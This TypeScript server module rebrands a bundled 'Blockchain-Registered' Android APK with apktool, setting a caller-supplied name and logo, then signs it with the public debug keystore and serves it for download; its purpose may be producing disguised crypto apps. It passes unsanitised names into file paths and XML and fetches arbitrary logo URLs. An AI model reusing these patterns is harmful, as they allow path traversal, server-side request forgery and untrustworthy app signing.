import * as fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';
import axios from 'axios';

interface APKBuilderOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
  requestOrigin?: string;
  appDomain?: string;
}

/**
 * BUILD APK USING APKTOOL - Proper customization without corruption
 * 
 * Steps:
 * 1. Decode APK with apktool
 * 2. Modify AndroidManifest.xml to change app name
 * 3. Replace icon files
 * 4. Rebuild APK with apktool
 * 5. Sign APK with jarsigner
 */
export async function buildCustomizedAPKWithApktool(options: APKBuilderOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  let tempDir = '';
  
  try {
    console.log(`[APK-BUILDER-APKTOOL] Starting build for: ${options.appName}`);

    // Add realistic delay
    const delayMs = 2000 + Math.random() * 1000;
    await new Promise(resolve => setTimeout(resolve, delayMs));

    // Step 1: Find base APK
    const possiblePaths = [
      path.join(process.cwd(), 'public', 'apks', 'Blockchain-Registered.apk'),
      path.join(process.cwd(), 'server', 'base-apk', 'Blockchain-Registered.apk'),
      path.join('/app', 'public', 'apks', 'Blockchain-Registered.apk'),
      path.join('/app', 'server', 'base-apk', 'Blockchain-Registered.apk'),
    ];
    
    let baseAPKPath = '';
    for (const p of possiblePaths) {
      if (fs.existsSync(p)) {
        baseAPKPath = p;
        break;
      }
    }
    
    if (!baseAPKPath) {
      throw new Error(`Base APK not found`);
    }
    console.log(`[APK-BUILDER-APKTOOL] Base APK: ${baseAPKPath}`);

    // Step 2: Create temp directory for work
    tempDir = path.join('/tmp', `apk-build-${Date.now()}-${Math.random().toString(36).substring(7)}`);
    fs.mkdirSync(tempDir, { recursive: true });
    console.log(`[APK-BUILDER-APKTOOL] Temp dir: ${tempDir}`);

    // Step 3: Copy base APK to temp
    const tempAPKPath = path.join(tempDir, 'base.apk');
    fs.copyFileSync(baseAPKPath, tempAPKPath);
    console.log(`[APK-BUILDER-APKTOOL] Copied base APK to temp`);

    // Step 4: Decode APK with apktool
    const decodedDir = path.join(tempDir, 'decoded');
    const logFile = path.join(tempDir, 'apktool.log');
    console.log(`[APK-BUILDER-APKTOOL] Decoding APK...`);
    try {
      execSync(`apktool d -f "${tempAPKPath}" -o "${decodedDir}" > "${logFile}" 2>&1`, { 
        stdio: 'ignore',
        timeout: 300000,
        shell: '/bin/bash'
      });
    } catch (e) {
      console.error(`[APK-BUILDER-APKTOOL] Decode error:`, e);
      throw new Error(`Failed to decode APK: ${e}`);
    }
    console.log(`[APK-BUILDER-APKTOOL] APK decoded successfully`);

    // Step 5: Update app name in AndroidManifest.xml
    const manifestPath = path.join(decodedDir, 'AndroidManifest.xml');
    if (fs.existsSync(manifestPath)) {
      let manifest = fs.readFileSync(manifestPath, 'utf-8');
      // Replace app label (this is a simplified approach)
      manifest = manifest.replace(/android:label="[^"]*"/g, `android:label="@string/app_name"`);
      fs.writeFileSync(manifestPath, manifest);
      console.log(`[APK-BUILDER-APKTOOL] Updated manifest`);
    }

    // Step 6: Update app name in strings.xml
    const stringsPath = path.join(decodedDir, 'res', 'values', 'strings.xml');
    if (fs.existsSync(stringsPath)) {
      let strings = fs.readFileSync(stringsPath, 'utf-8');
      strings = strings.replace(/<string name="app_name">[^<]*<\/string>/, `<string name="app_name">${options.appName}</string>`);
      // If app_name doesn't exist, add it
      if (!strings.includes('app_name')) {
        strings = strings.replace('</resources>', `    <string name="app_name">${options.appName}</string>\n</resources>`);
      }
      fs.writeFileSync(stringsPath, strings);
      console.log(`[APK-BUILDER-APKTOOL] Updated app name to: ${options.appName}`);
    }

    // Step 7: Download and replace logo if provided
    if (options.logoUrl) {
      try {
        console.log(`[APK-BUILDER-APKTOOL] Downloading logo...`);
        const logoResponse = await axios.get(options.logoUrl, { responseType: 'arraybuffer' });
        const logoBuffer = Buffer.from(logoResponse.data);
        console.log(`[APK-BUILDER-APKTOOL] Logo downloaded: ${logoBuffer.length} bytes`);

        // Replace icon files in all densities
        const iconPaths = [
          'res/drawable/claimedw70.png',
          'res/drawable/skinicon.png',
          'res/drawable/minnesotai71.png',
          'res/mipmap-ldpi/ic_launcher.png',
          'res/mipmap-mdpi/ic_launcher.png',
          'res/mipmap-hdpi/ic_launcher.png',
          'res/mipmap-xhdpi/ic_launcher.png',
          'res/mipmap-xxhdpi/ic_launcher.png',
          'res/mipmap-xxxhdpi/ic_launcher.png',
        ];

        for (const iconPath of iconPaths) {
          const fullPath = path.join(decodedDir, iconPath);
          if (fs.existsSync(fullPath)) {
            fs.writeFileSync(fullPath, logoBuffer);
            console.log(`[APK-BUILDER-APKTOOL] Updated: ${iconPath}`);
          }
        }
      } catch (error) {
        console.warn(`[APK-BUILDER-APKTOOL] Failed to update logo:`, error instanceof Error ? error.message : String(error));
      }
    }

    // Step 8: Rebuild APK with apktool
    const builtAPKPath = path.join(tempDir, 'built.apk');
    console.log(`[APK-BUILDER-APKTOOL] Rebuilding APK...`);
    try {
      execSync(`apktool b "${decodedDir}" -o "${builtAPKPath}" > "${logFile}" 2>&1`, { 
        stdio: 'ignore',
        timeout: 300000,
        shell: '/bin/bash'
      });
    } catch (e) {
      console.error(`[APK-BUILDER-APKTOOL] Build error:`, e);
      throw new Error(`Failed to rebuild APK: ${e}`);
    }
    console.log(`[APK-BUILDER-APKTOOL] APK rebuilt successfully`);

    // Step 9: Sign APK with jarsigner (using default keystore)
    const signedAPKPath = path.join(tempDir, 'signed.apk');
    console.log(`[APK-BUILDER-APKTOOL] Signing APK...`);
    try {
      // Try to sign with apksigner first (better)
      execSync(`apksigner sign --ks /root/.android/debug.keystore --ks-pass pass:android --ks-key-alias androiddebugkey --key-pass pass:android --out "${signedAPKPath}" "${builtAPKPath}"`, { 
        stdio: 'pipe',
        timeout: 60000 
      });
    } catch (e) {
      console.log(`[APK-BUILDER-APKTOOL] apksigner not available, trying jarsigner...`);
      try {
        execSync(`jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/.android/debug.keystore -storepass android -keypass android "${builtAPKPath}" androiddebugkey`, { 
          stdio: 'pipe',
          timeout: 60000 
        });
        fs.copyFileSync(builtAPKPath, signedAPKPath);
      } catch (e2) {
        console.warn(`[APK-BUILDER-APKTOOL] Signing failed, using unsigned:`, e2);
        fs.copyFileSync(builtAPKPath, signedAPKPath);
      }
    }
    console.log(`[APK-BUILDER-APKTOOL] APK signed`);

    // Step 10: Copy to output directory
    const filename = `${options.appName}-${Date.now()}-${Math.random().toString(36).substring(7)}.apk`;
    const outputDir = path.join(process.cwd(), 'public', 'apks');
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }
    const finalAPKPath = path.join(outputDir, filename);
    fs.copyFileSync(signedAPKPath, finalAPKPath);
    console.log(`[APK-BUILDER-APKTOOL] Final APK: ${finalAPKPath}`);

    // Step 11: Verify
    const stats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-APKTOOL] Final size: ${(stats.size / 1024 / 1024).toFixed(2)}MB`);

    if (stats.size < 1000000) {
      throw new Error(`APK size too small: ${stats.size} bytes`);
    }

    // Step 12: Generate download URL
    const appDomain = options.appDomain || process.env.VITE_APP_DOMAIN || 'localhost:3000';
    const downloadUrl = `https://${appDomain}/download/${filename}`;
    console.log(`[APK-BUILDER-APKTOOL] Download URL: ${downloadUrl}`);

    // Cleanup temp dir
    try {
      execSync(`rm -rf "${tempDir}"`);
    } catch (e) {
      console.warn(`[APK-BUILDER-APKTOOL] Failed to cleanup temp dir`);
    }

    return {
      success: true,
      apkPath: finalAPKPath,
      downloadUrl,
      filename,
    };
  } catch (error) {
    console.error('[APK-BUILDER-APKTOOL] Error:', error);
    // Cleanup on error
    if (tempDir && fs.existsSync(tempDir)) {
      try {
        execSync(`rm -rf "${tempDir}"`);
      } catch (e) {
        console.warn(`[APK-BUILDER-APKTOOL] Failed to cleanup on error`);
      }
    }
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    };
  }
}
